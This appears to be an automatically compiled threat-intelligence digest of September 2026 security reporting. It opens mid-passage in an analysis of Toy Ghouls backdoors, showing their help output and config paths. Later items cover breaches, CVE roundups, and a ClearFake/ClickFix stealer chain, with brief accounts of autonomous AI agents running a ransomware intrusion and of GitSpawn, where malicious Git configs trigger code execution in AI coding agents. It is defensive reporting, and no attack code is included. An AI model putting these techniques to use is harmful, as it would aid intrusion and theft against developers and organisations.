Uninstall the system service -- seal Encrypt sensitive config fields in - place using a machine - bound key - h , -- help Print help - V , -- version Print version HiveMQ version backdoor help output In the Element version, the backdoor help output looks as follows: C:\wtass.exe -h Matrix monitoring agent Usage: wtass.exe [OPTIONS] [COMMAND] Commands: install Register this agent with the Matrix homeserver and panel uninstall Remove this agent's service and credentials service Run as a Windows service (internal) help Print this message or the help of the given subcommand(s) Options: -c, --config <CONFIG> -h, --help Print help -V, --version Print version 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 C : \ wtass . exe - h Matrix monitoring agent Usage : wtass . exe [ OPTIONS ] [ COMMAND ] Commands : install Register this agent with the Matrix homeserver and panel uninstall Remove this agent ' s service and credentials service Run as a Windows service ( internal ) help Print this message or the help of the given subcommand ( s ) Options : - c , -- config < CONFIG > - h , -- help Print help - V , -- version Print version Element version backdoor help output By default, the backdoor looks for a config.toml configuration file in the directory where the executable was launched, then falls back to %PROGRAMDATA%\SynapseAgent\config.toml (Element version) or %PROGRAMDATA%\cplsupport\config.toml (HiveMQ version). If no configuration file is found in either location, the full path can be specified using the -c (--config) option. The backdoor accepts both unencrypted configuration files and files with partially encrypted sections. In the first case, once the b
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Angry Birds: Toy Ghouls’ new toys
  - Published: 2026-09-04T10:00:05+00:00
  - Link: https://securelist.com/toy-ghouls-new-hivemq-and-element-backdoors/121270/
  - Summary: Kaspersky GERT experts have discovered new backdoors used by the Toy Ghouls group. One version of the backdoor uses the HiveMQ MQTT broker as its command-and-control server; the other uses the Matrix-based Element messenger.

### Cluster 22339b9409 — score 10

- Title: 7th September – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-09-07T14:54:29+00:00
- Link: https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- affected_industries: healthcare, manufacturing_industrial
- affected_products: Anthropic/Claude, Microsoft Windows, SonicWall
- cve_ids: CVE-2026-82329, CVE-2026-83548, CVE-2026-83549
- urgency_signals: critical_cvss, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- affected_industries: healthcare, manufacturing_industrial
- affected_products: SonicWall, Microsoft Windows, Anthropic/Claude
- cve_ids: CVE-2026-83548, CVE-2026-83549, CVE-2026-82329
- urgency_signals: zero_day, preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files […] The post 7th September – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 7th September – Threat Intelligence Report September 7, 2026 https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files containing court records, including names and other personal information. Hit, a major Slovenian gambling and tourism operator, has sustained a cyberattack that forced six casinos to close for about three days. Operations have resumed, but some table games, bingo, loyalty services, cash registers, and hotel systems remained unavailable during restoration, while some employees were temporarily furloughed. Baylor Genetics, a US clinical diagnostic laboratory, has disclosed a data breach affecting 2.8M patients and employees after unauthorized access to part of its IT environment in June. Stolen data included names, birth dates, medical testing and laboratory results, health insurance information, and some Social Security numbers. Global cloud storage provider Dropbox has disclosed unauthorized access to about 5,000 accounts after attackers exploited Lenovo’s email verification process. Fraudulent Lenovo IDs created with victims’ email addresses enabled access without Dropbox passwords, while files were viewed or downloaded from affected accounts. AI THREATS Researchers have detailed an AI-assisted ransomware intrusion that compromised an enterprise network in under 10 hours. Autonomous agents mapped internal systems, mined code repositories, obtained root credentials from a secrets manager, and abused build pipelines and cloud resources, compressing activity that normally requires substantially more human effort. Security researchers have disclosed GitSpawn, a vulnerability class affecting AI coding agents including Claude Code, Codex, Cursor, Goose, Qwen Code, Grok Build, and Hermes. Malicious repository Git configurations can trigger arbitrary code execution as the developer when agents automatically gather project context, in some cases before trust prompts. Researchers have showcased how an AI coding assistant can be used to port a known PLC exploit to a different controller model, producing working payloads after guided analysis. While the process still required significant manual effort, it demonstrated how AI can accelerate exploit development for industrial systems. VULNERABILITIES AND PATCHES SonicWall has addressed CVE-2026-83548 and CVE-2026-83549, critical vulnerabilities affecting SMA 1000 remote access gateways. CVE-2026-83548 is a pre-authentication SSRF flaw rated CVSS 10.0, while CVE-2026-83549 enables post-authentication remote code execution. Both were exploited as zero-days and affect SMA 6210, 7210, and 8200v appliances. JFrog has addressed CVE-2026-82329, a critical CVSS 9.8 authentication bypass affecting self-hosted Artifactory deployments. The flaw allows unauthenticated attackers to obtain administrator access tokens and take control of repositories. Exploitation was observed shortly after disclosure against internet-exposed systems, while JFrog Cloud environments were patched by the vendor. Check Point IPS provides protection against this threat (JFrog Artifactory Authentication Bypass (CVE-2026-82329)) Security researcher have unveiled FalconFlank, a zero-day privilege escalation technique affecting CrowdStrike Falcon on Windows 11 25H2 and Windows Server 2025. The proof-of-concept abuses Falcon’s Microsoft Office macro-removal remediation behavior, allowing a low-privileged local user to obtain elevated access on affected systems THREAT INTELLIGENCE REPORTS Check Point Research has uncovered a Chinese-speaking cybercrime clus
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 7th September – Threat Intelligence Report
  - Published: 2026-09-07T14:54:29+00:00
  - Link: https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files […] The post 7th September – Threat Intelligence Report appeared first on Check Point Research .

### Cluster 5c29932a73 — score 10

- Title: August 2026 CVE Landscape
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-08T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/august-2026-cve-landscape
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Apple iOS/macOS, Cisco, Gitea
- cve_ids: CVE-2025-62593, CVE-2026-3395, CVE-2026-59800, CVE-2026-72898, CVE-2026-9198
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Gitea, Cisco, Apple iOS/macOS
- cve_ids: CVE-2025-62593, CVE-2026-72898, CVE-2026-9198, CVE-2026-3395, CVE-2026-59800
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In August 2026, Insikt Group® identified 73 high-impact vulnerabilities that should be prioritized for remediation, 43 of which had a Very Critical Recorded Future Risk Score. This represents a 14% decrease from last month.
```

#### Full body

```
August 2026 CVE Landscape In August 2026, Insikt Group® identified 73 high-impact vulnerabilities that should be prioritized for remediation , 43 of which had a Very Critical Recorded Future Risk Score. This represents a 14% decrease from last month. 31 of these vulnerabilities were surfaced through the US Cybersecurity and Infrastructure Security Agency (CISA)’s Known Exploited Vulnerabilities (KEV) catalog, 32 were reported in open sources and validated by Insikt Group, seven were sourced through security vendor telemetry, and three were exclusively surfaced through honeypot data. The 73 vulnerabilities in this blog affected products from 45 vendors, with Microsoft accounting for approximately 11% of the vulnerabilities. The remaining exposure spanned remote monitoring and management, virtualization, application delivery, collaboration, artificial intelligence, developer, analytics, identity, operational technology, content management, network edge, video surveillance, and endpoint technologies. In August, Insikt Group created Nuclei templates to detect CVE-2025-62593 (Ray), CVE-2026-72898 (Metabase), and CVE-2026-9198 (IBM Langflow). Each of these vulnerabilities is featured in this blog. Additionally, Insikt Group had previously created templates to detect CVE-2026-3395 (MaxSite CMS) and CVE-2026-59800 (decolua 9Router), but their exploitation was reported in July, so they are not listed in the August 2026 Vulnerability Table. Additionally, Insikt Group created a Nuclei template to detect GitHub Issue #4255 affecting Apache Log4j, a deserialization allowlist bypass that Apache classified as a hardening gap rather than a Log4j vulnerability; as such, it was not assigned a CVE. These Nuclei templates are available to customers via the Recorded Future Intelligence Platform. Quick reference: August 2026 vulnerability table All 70 vulnerabilities below were actively exploited or operationally weaponized in August 2026. This table does not include the three CVEs that were primarily surfaced through honeypot data, which are available to Recorded Future Intelligence Platform customers via the CVE Monthly report. The table below also provides examples of public PoCs identified by Insikt Group. These PoCs were not tested for accuracy or efficacy. Vulnerability management teams should exercise caution and verify the validity of PoCs before testing. # Vulnerability Risk Score Vendor/Product KEV RCE PoC 1 CVE-2026-81578 99 PaperCut NG/MF ✓ Link ✓ 2 CVE-2026-82078 99 PaperCut NG/MF ✓ ✓ Link ✓ 3 CVE-2015-3246 99 Red Hat Libuser ✓ Link ✓ 4 CVE-2015-5287 99 Red Hat Automatic Bug Reporting Tool ✓ Link ✓ 5 CVE-2017-0199 99 Microsoft Office and WordPad ✓ Link ✓ 6 CVE-2017-5753 99 Intel Link ✓ 7 CVE-2019-1068 99 Microsoft SQL Server ✓ ✓ Link ✓ 8 CVE-2019-18935 99 Progress Telerik UI for ASP.NET AJAX ✓ Link ✓ 9 CVE-2020-0796 99 Microsoft Windows 10 and Windows Server ✓ Link ✓ 10 CVE-2020-1472 99 Microsoft Windows Server Link ✓ 11 CVE-2021-23758 99 Ajax.NET Professional ✓ ✓ Link ✓ 12 CVE-2021-3156 99 sudo Link ✓ 13 CVE-2022-0847 99 Linux kernel Link ✓ 14 CVE-2022-0995 99 Linux kernel ✓ Link ✓ 15 CVE-2023-49105 99 ownCloud ✓ 16 CVE-2025-62593 99 Ray-Project Ray ✓ ✓ Link ✓ 17 CVE-2026-18556 99 N-able N-central ✓ 18 CVE-2026-18577 99 N-able N-central ✓ 19 CVE-2026-20349 99 Cisco Secure Firewall Adaptive Security Appliance (ASA) and Secure Firewall Threat Defense (FTD) ✓ 20 CVE-2026-21962 99 Oracle HTTP Server and Oracle WebLogic Server Proxy Plug-in ✓ 21 CVE-2026-33824 99 Microsoft Internet Key Exchange (IKE) Service Extensions ✓ ✓ 22 CVE-2026-34486 99 Apache Tomcat ✓ Link ✓ 23 CVE-2026-39987 99 Marimo ✓ Link ✓ 24 CVE-2026-53362 99 Linux kernel ✓ 25 CVE-2026-55040 99 Microsoft SharePoint ✓ Link ✓ 26 CVE-2026-59310 99 Broadcom VMware vCenter ✓ ✓ Link ✓ 27 CVE-2026-60004 99 Gitea ✓ ✓ Link ✓ 28 CVE-2026-63030 99 WordPress ✓ Link ✓ 29 CVE-2026-63077 99 JetBrains TeamCity ✓ ✓ 30 CVE-2026-64849 99 MLflow ✓ Link ✓ 31 CVE-2026-65400 99 Apple macOS ✓ Link ✓
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: August 2026 CVE Landscape
  - Published: 2026-09-08T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/august-2026-cve-landscape
  - Summary: In August 2026, Insikt Group® identified 73 high-impact vulnerabilities that should be prioritized for remediation, 43 of which had a Very Critical Recorded Future Risk Score. This represents a 14% decrease from last month.

### Cluster 396a583814 — score 10

- Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-04T17:46:19+00:00
- Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.
```

#### Full body

```
What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever Horizon3 September 4, 2026 Blogs For three days at Fal.Con 2026, Horizon3 was hard to miss across the show floor. Our booth stayed packed, our team ran demo after demo of NodeZero®, dozens of people packed into Snehal Antani’s two sessions, and Ward Holloway’s theater session was standing room only. But the biggest takeaway wasn’t the traffic, the sessions, or even the more than 1,300 Go Hack Yourself shirts we handed out. It was the conversations behind all of it. AI is accelerating vulnerability discovery and compressing the time between discovery and potential exploitation, but security teams already have more vulnerabilities than they can reasonably fix. Finding more of them, faster, only makes one question more important: Which exposures actually matter in my environment? This is a question that came up again and again at Fal.Con. Offense is increasingly informing defense That same thinking showed up on Fal.Con’s biggest stage. In his keynote, CrowdStrike CEO George Kurtz spoke about AI as the new cyber battlefield, offense informing defense, AI red teaming, and the need for a continuous approach to security. Those themes closely reflect something Horizon3 has believed from the beginning: the best way to understand whether your defenses will stand up to an attacker is to attack them yourself. As AI increases attacker speed and scale, defenders need offensive capabilities that continuously test real environments and provide evidence of what attackers can exploit, how far they can get, which controls stop them, and whether remediation worked. That attacker-derived evidence is also central to Horizon3’s integration with Falcon Next-Gen SIEM and the perspective we bring to CrowdStrike’s Project QuiltWorks. AI is accelerating discovery. That makes validation more important. Ward tackled this directly in his session, “Beyond the Mythos Hype.” AI is getting better at finding and validating vulnerabilities, compressing work that once required significant time and expertise. That changes the speed of the problem, but it doesn’t change a fundamental reality for defenders: you cannot fix everything. Security teams already have vulnerability scanners, attack surface management tools, threat intelligence, endpoint telemetry, identity data, and plenty of other signals telling them what could represent risk. Accelerating vulnerability discovery adds even more pressure to an already overloaded system. The challenge is determining which weaknesses create real exposure in your environment, how they can be chained together, and where those attack paths can lead. The standing-room-only crowd for Ward’s session reinforced what we were hearing throughout the show: this challenge is very much on defenders’ minds. Vulnerable does not mean exploitable Snehal approached the same problem from the attacker’s perspective in “Go Hack Yourself. With AI.” His message was straightforward: instead of waiting for attackers to tell you whether your defenses work, continuously attack yourself to find out. That means testing the environment to answer questions vulnerability data alone cannot. Can a vulnerability actually be exploited? Can a credential be abused? Can an attacker move laterally or escalate privileges? Do your security controls stop them? Can several seemingly unrelated weaknesses be chained together to reach something that matters? The answers can materially change what gets fixed first. A critical vulnerability that isn’t proven exploitable in your environment may deserve a very different response from a weakness buried somewhere in a scanner backlog that provides a proven path to critical systems or data. The goal isn’t another score. It’s evidence security teams can use to decide what matters, take action, and then prove that action worked. That closed loop is what continuous exposure management ultimately requires. That’s the idea behind Hack. Fix. Verify. Repe
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: What Fal.Con 2026 Reinforced: AI Makes Proving Exposure More Important Than Ever
  - Published: 2026-09-04T17:46:19+00:00
  - Link: https://horizon3.ai/intelligence/blogs/fal-con-2026-ai-exposure-validation/
  - Summary: AI is accelerating vulnerability discovery, but security teams still need to know which exposures actually matter. Here’s what Fal.Con 2026 reinforced about offensive security, validation, and proving risk.

### Cluster bfe3e974bb — score 10

- Title: How Virginia Tech Connected Pentesting to Its Engineering Workflow
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-03T16:33:01+00:00
- Link: https://horizon3.ai/customer-story/virginia-tech-automated-external-pentesting/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: GitLab

#### Cluster taxonomy (union across members)
- affected_products: GitLab
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_products: GitLab
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how Virginia Tech used the NodeZero GraphQL API, GitLab, and ServiceNow to automate external pentesting and create a repeatable workflow from attack validation to remediation.
```

#### Full body

```
How Virginia Tech Connected Pentesting to Its Engineering Workflow Horizon3 Customer Stories Finding exploitable risk is only part of the security challenge. In large, decentralized organizations, findings also need to reach the right owners and move into remediation without creating another disconnected process. Virginia Tech needed a scalable way to validate external exposure across an environment spanning hundreds of independent departments, multiple locations, cloud providers, and locally managed infrastructure. This customer story explores how Virginia Tech used the NodeZero® GraphQL API to automate external pentesting through GitLab and route findings into ServiceNow, creating a repeatable workflow from attack validation to remediation. Key Insight Security testing creates more value when findings flow directly into the systems teams already use to manage engineering work and remediation. Rather than treating pentesting as a standalone security activity, Virginia Tech integrated NodeZero into its existing engineering processes. The result: Automated external pentesting through GitLab Attack validation integrated into an existing engineering workflow Direct routing of findings into ServiceNow Clear assignment and follow-up for subnet owners A repeatable process connecting testing, ownership, and remediation Greater accountability across a highly decentralized environment What You’ll Learn How to operationalize pentesting across a large, federated organization How the NodeZero GraphQL API enables security workflow automation How Virginia Tech integrated autonomous pentesting with GitLab Why routing findings directly into ServiceNow improves remediation workflows How automation helps lean security teams scale external attack validation How to connect security findings with the teams responsible for remediation Why pentesting shouldn’t end when a report is produced Why It Matters Large organizations often distribute technology ownership across many teams. That makes security validation as much an operational challenge as a technical one. At Virginia Tech, the security organization supports an environment serving more than 38,000 students, with hundreds of independent departments and infrastructure spanning Virginia, the Washington, D.C., area, major cloud providers, and public-facing assets around the world. Generating another security report wouldn’t solve the coordination problem. By using NodeZero as the attack validation layer between GitLab and ServiceNow, Virginia Tech created a workflow in which testing can run automatically, findings reach responsible owners, and remediation is tracked through established processes. Testing no longer ends when the pentest does. Each run becomes part of a repeatable security operation connecting validation → ownership → remediation . Download the customer story to see how Virginia Tech integrated NodeZero with GitLab and ServiceNow to automate external pentesting and create a repeatable path from attack validation to remediation. Download the customer story How can NodeZero help you? Let our experts walk you through a demonstration of NodeZero ® , so you can see how to put it to work for your organization. Get a Demo Share:
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: How Virginia Tech Connected Pentesting to Its Engineering Workflow
  - Published: 2026-09-03T16:33:01+00:00
  - Link: https://horizon3.ai/customer-story/virginia-tech-automated-external-pentesting/
  - Summary: See how Virginia Tech used the NodeZero GraphQL API, GitLab, and ServiceNow to automate external pentesting and create a repeatable workflow from attack validation to remediation.

### Cluster 9591bee159 — score 10

- Title: Scans for Proxmox Servers, (Wed, Sep 9th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-09T17:46:24+00:00
- Link: https://isc.sans.edu/diary/rss/33324
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
About a week ago, Proxmox published an advisory revealing a vulnerability in older versions of Proxmox VE, its flagship Virtual Environment product. The vulnerability only affects version 7, which has not been supported for a couple of years now.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Scans for Proxmox Servers, (Wed, Sep 9th)
  - Published: 2026-09-09T17:46:24+00:00
  - Link: https://isc.sans.edu/diary/rss/33324
  - Summary: About a week ago, Proxmox published an advisory revealing a vulnerability in older versions of Proxmox VE, its flagship Virtual Environment product. The vulnerability only affects version 7, which has not been supported for a couple of years now.

### Cluster f08ee4366d — score 10

- Title: Microsoft Patch Tuesday for September 2026 — Snort rules and prominent vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-08T22:16:35+00:00
- Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Azure, Cisco
- cve_ids: CVE-2026-69676, CVE-2026-69852, CVE-2026-72957, CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Azure, Cisco
- cve_ids: CVE-2026-81963, CVE-2026-85880, CVE-2026-69676, CVE-2026-69852, CVE-2026-72957
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft has released its monthly security update for September 2026, which includes 973 vulnerabilities affecting a range of products, including 113 that Microsoft marked as "critical."
```

#### Full body

```
Microsoft Patch Tuesday for September 2026 — Snort rules and prominent vulnerabilities By Cisco Talos Tuesday, September 8, 2026 18:16 Patch Tuesday Microsoft has released its monthly security update for September 2026, which includes 973 vulnerabilities affecting a range of products, including 113 that Microsoft marked as "critical." Microsoft notes that 2 of the vulnerabilities disclosed this month have been exploited in the wild: CVE-2026-81963 affects Windows Update Stack. CVE-2026-81963 is a elevation of privilege vulnerability associated with Improper Link Resolution Before File Access ('Link Following') and Improper Access Control and has a CVSS base score of 7.8. CVE-2026-85880 affects Windows Advanced Local Procedure Call (ALPC). CVE-2026-85880 is a elevation of privilege vulnerability associated with Heap-based Buffer Overflow and Use of Uninitialized Resource and has a CVSS base score of 7.8. Out of 113 "critical" vulnerabilities, 82 are remote code execution (RCE) vulnerabilities. Microsoft considers exploitation of the following vulnerabilities more likely: CVE-2026-69676 affects Windows Kerberos. CVE-2026-69676 is a remote code execution vulnerability associated with Authentication Bypass by Capture-replay and has a CVSS base score of 8.8. CVE-2026-69852 affects Windows Routing and Remote Access Service (RRAS). CVE-2026-69852 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 7.5. CVE-2026-72957 affects Windows Deployment Services. CVE-2026-72957 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-69854 affects Spring Cloud Azure. CVE-2026-69854 is a elevation of privilege vulnerability associated with Improper Authentication and has a CVSS base score of 9.0. CVE-2026-83501 affects Windows Virtualization-Based Security (VBS). CVE-2026-83501 is a information disclosure vulnerability associated with Out-of-bounds Read and has a CVSS base score of 5.5. CVE-2026-70585 affects Windows Services for NFS ONCRPC XDR Driver. CVE-2026-70585 is a remote code execution vulnerability associated with Use After Free and has a CVSS base score of 7.0. CVE-2026-69730 affects Windows DNS Server. CVE-2026-69730 is a remote code execution vulnerability associated with Use After Free and has a CVSS base score of 9.8. CVE-2026-69857 affects Azure Cosmos DB. CVE-2026-69857 is a spoofing vulnerability associated with Authorization Bypass Through User-Controlled Key and has a CVSS base score of 8.5. Microsoft considers exploitation of the following vulnerabilities less likely: CVE-2026-69845 and CVE-2026-72979 affect Windows DHCP Server. CVE-2026-69845 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and Improper Input Validation and has a CVSS base score of 9.8. CVE-2026-72979 is a remote code execution vulnerability associated with Use After Free and has a CVSS base score of 9.8. CVE-2026-58599 affects HEVC Video Extensions. CVE-2026-58599 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 7.8. CVE-2026-65772 affects Microsoft Dynamics 365 On-Premises. CVE-2026-65772 is a remote code execution vulnerability associated with Deserialization of Untrusted Data and has a CVSS base score of 8.8. CVE-2026-66302 affects Skype for Business. CVE-2026-66302 is a remote code execution vulnerability associated with External Control of File Name or Path and has a CVSS base score of 9.8. CVE-2026-67631 , CVE-2026-65669 , and CVE-2026-67378 affect Microsoft SQL Server. CVE-2026-67631 is a remote code execution vulnerability associated with Heap-based Buffer Overflow and has a CVSS base score of 8.8. CVE-2026-65669 is a elevation of privilege vulnerability associated with Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') and has a CVSS base score of 9.6. CVE-2026-67378 is a re
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Microsoft Patch Tuesday for September 2026 — Snort rules and prominent vulnerabilities
  - Published: 2026-09-08T22:16:35+00:00
  - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
  - Summary: Microsoft has released its monthly security update for September 2026, which includes 973 vulnerabilities affecting a range of products, including 113 that Microsoft marked as "critical."

### Cluster 93c6fb73a4 — score 10

- Title: ClearFake WebDAV infection chain delivers Amatera stealer, ZigCryptoStealer, and NetSupport Manager
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-08T10:01:07+00:00
- Link: https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services, government
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services, government
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
We assess with moderate confidence that the attacks are not targeted at a particular organization, but are a part of a cryptocurrency and credentials-stealing operation using the Amatera stealer as the primary payload.
```

#### Full body

```
ClearFake WebDAV infection chain delivers Amatera stealer, ZigCryptoStealer, and NetSupport Manager By Vanja Svajcer Tuesday, September 8, 2026 06:01 Threats Threat Spotlight Cisco Talos began an investigation after observing a DLL named "verification.google" executing from WebDAV at a Ukrainian government organization. We assess with moderate confidence that the attacks are not targeted at a particular organization, but are a part of a cryptocurrency and credentials-stealing operation using the Amatera stealer as the primary payload. Pivoting around the similar WebDAV behavior led to a second loader named "pf.ch" and allowed us to reconstruct its earlier delivery stages. The chain uses a Cloudflare Worker to inject JavaScript code stored on BNB Smart Chain and a ClickFix prompt impersonating Google CAPTCHA, leading to download and execution of Amatera stealer. The chain is likely very similar to what has caused the WebDAV-based execution at the Ukraininan government organization. The two Amatera builds were tasked with different secondary payloads by their respective command-and-control (C2) infrastructure: the "pf.ch" loader was instructed to deploy a NativeAOT loader running ZigCryptoStealer and a Go-based reverse proxy, while the "verification.google" loader was instructed to install an unauthorized instance of NetSupport Manager. The NetSupport Manager installation contained configuration with the C2 server using an IP address based in Russia. With moderate confidence, we assess that "verification.google" branch attack was conducted by a Russian threat actor. In April 2026, Cisco Talos identified an unusual WebDAV DLL execution in endpoint telemetry from a Ukrainian government organization. The remote file was named "verification.google" and was launched through the 32-bit version of "rundll32.exe". This initial finding led us to two similar delivery chains, two different DLL loaders and two ACR/Amatera stealer payloads. Talos tracks the actor behind the observed "verification.google" activity as UAT-10820. Following the initial investigation, we decided to hunt for similar WebDAV and ordinal-execution patterns in an attempt to recover the full infection chain. Using VirusTotal, we were able to identify a full chain from a second DLL loader named "pf.ch". These two examples are a part of a wider set of recent campaigns delivering Amatera through different infection chains. In July 2026, Malwarebytes documented fake game and software downloads that used RenPy Loader, MSBuild and EtherHiding before delivering Amatera. Blackpoint Cyber described another fake-verification chain that used a signed Microsoft App-V script, configuration stored in Google Calendar and a payload concealed in a PNG image. Apart from the main payload malware family, we found no common infrastructure or other evidence linking those activities to the chains described in this post. Initial finding in endpoint telemetry The initial event that started the investigation was recorded in April 2026 and it showed an execution of a DLL file through a WebDAV UNC path together with startup of the Windows WebClient service. Apart from the initial command line, we had details of the checksum of the executed DLL but it was not clear what started the execution chain. It was time for hunting in open source intelligence repositories and Talos analytical platform. We wanted to find a similar execution with the similar loader and the payload family and ideally recover the whole infection chain which would likely point to how "verification.google" execution was triggered. This lead us to the "pf.ch" loader and the chain we discovered. Hunting reveals a second WebDAV delivery chain The "pf.ch" sample uses the same combination of WebDAV, a disguised DLL filename and ordinal execution through "rundll32.exe". We were also able to recover the full ClickFake related sequence leading to this loader. Figure 1 shows both chains, with dashed elements marking stages that were not d
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: ClearFake WebDAV infection chain delivers Amatera stealer, ZigCryptoStealer, and NetSupport Manager
  - Published: 2026-09-08T10:01:07+00:00
  - Link: https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
  - Summary: We assess with moderate confidence that the attacks are not targeted at a particular organization, but are a part of a cryptocurrency and credentials-stealing operation using the Amatera stealer as the primary payload.

### Cluster 2e68cba663 — score 10

- Title: The story behind the intelligence
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-03T18:00:13+00:00
- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
```

#### Full body

```
The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption 